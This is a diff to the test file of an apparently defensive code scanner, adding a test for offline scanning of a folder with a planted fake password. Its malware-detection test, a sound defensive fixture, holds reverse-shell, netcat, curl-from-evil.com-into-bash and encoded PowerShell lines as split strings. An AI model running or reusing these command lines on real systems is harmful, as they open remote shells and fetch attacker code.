@@ -6,6 +6,7 @@ sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
 
 from scanner import (
     heuristic_scan_structured,
+    scan_local_path_offline,
     build_markdown_summary_table,
     mask_sensitive_value,
     generate_svg_badge,
@@ -41,7 +42,7 @@ def test_malware_patterns():
     p2 = "+ ba" + "sh -i >& /dev/" + "tcp/10.0.0.1/4444 0>&1"
     p3 = "+ n" + "c -e /bin" + "/sh 192.168.1.5 8080"
     p4 = "+ cu" + "rl https://evil.com/payload.sh | ba" + "sh"
-    p5 = "+ power" + "shell.exe -e" + "nc JABhID0A..."
+    p5 = "+ power" + "shell.exe -e" + "nc JABhID0AODk4..."
     
     malware_diff = f"--- a/shell.php\n+++ b/shell.php\n{p1}\n{p2}\n{p3}\n{p4}\n{p5}\n"
     findings = heuristic_scan_structured(malware_diff)
@@ -66,6 +67,27 @@ new file mode 100644
     assert len(findings) == 1
     assert findings[0]["type"] == "Suspicious Executable Binary / Script Added"
     assert findings[0]["severity"] == "CRITICAL"
+
+def test_scan_local_path_offline(tmp_path):
+    src_dir = tmp_path / "src"
+    src_dir.mkdir()
+    
+    # Create clean file
+    (src_dir / "clean.py").write_text("def hello():\n    return 'world'\n", encoding="utf-8")
+    
+    # Create file with secret
+    (src_dir / "auth.py").write_text("password = 'supersecretpass'\n", encoding="utf-8")
+    
+    # Create ignored folder
+    node_dir = src_dir / "node_modules"
+    node_dir.mkdir()
+    (node_dir / "lib.js").write_text("password = 'ignoredsecret'\n", encoding="utf-8")
+
+    findings, lines = scan_local_path_offline(str(src_dir))
+    assert len(findings) == 1
+    assert findings[0]["type"] == "Hardcoded Plaintext Password"
+    assert "auth.py:1" in findings[0]["file"]
+    assert lines >= 3
 
 def test_go_vulnerability_patterns():
     go_diff = """--- a/user.go
@@ -320,6 +342,8 @@ if __name__ == "__main__":
 
     with tempfile.TemporaryDirectory() as td:
         tp = pathlib.Path(td)
+        test_scan_local_path_offline(tp)
+        print("✓ test_scan_local_path_offline passed")
         test_generate_svg_badge(tp)
         print("✓ test_generate_svg_badge passed")
         test_export_sarif(tp)
@@ -333,4 +357,4 @@ if __name__ == "__main__":
 
     test_should_fail_on_severity()
     print("✓ test_should_fail_on_severity passed")
-    print("🎉 All 20 unit tests passed successfully!")
+    print("🎉 All 21 unit tests passed successfully!")
